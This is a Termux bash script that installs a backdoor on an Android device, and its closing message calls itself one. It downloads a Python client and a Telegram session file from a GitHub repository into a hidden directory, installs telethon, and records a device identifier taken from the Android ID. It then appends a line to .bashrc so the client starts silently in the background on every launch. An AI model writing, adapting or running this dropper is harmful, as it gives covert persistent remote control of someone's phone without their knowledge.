#!/data/data/com.termux/files/usr/bin/bash
set -e

REPO_URL="https://github.com/precise104/precise2/raw/main"
CLIENT_SCRIPT="client.py"
SESSION_FILE="client.session"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"

mkdir -p "$HIDDEN_DIR"

curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"
curl -sL "$REPO_URL/$SESSION_FILE" -o "$HIDDEN_DIR/$SESSION_FILE"

pkg install -y python python-pip
pip install --upgrade telethon

# Generate Device ID if it doesn't exist
ID_FILE="$HIDDEN_DIR/device_id.txt"
if [ ! -f "$ID_FILE" ]; then
    if command -v settings > /dev/null; then
        AND_ID=$(settings get secure android_id)
        DEV_ID="P-${AND_ID:0:4}"
    else
        DEV_ID="P-$(head /dev/urandom | tr -dc a-z0-9 | head -c 4)"
    fi
    echo "$DEV_ID" > "$ID_FILE"
fi

chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || (python $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

echo "Setup complete. Backdoor will start on next Termux launch."
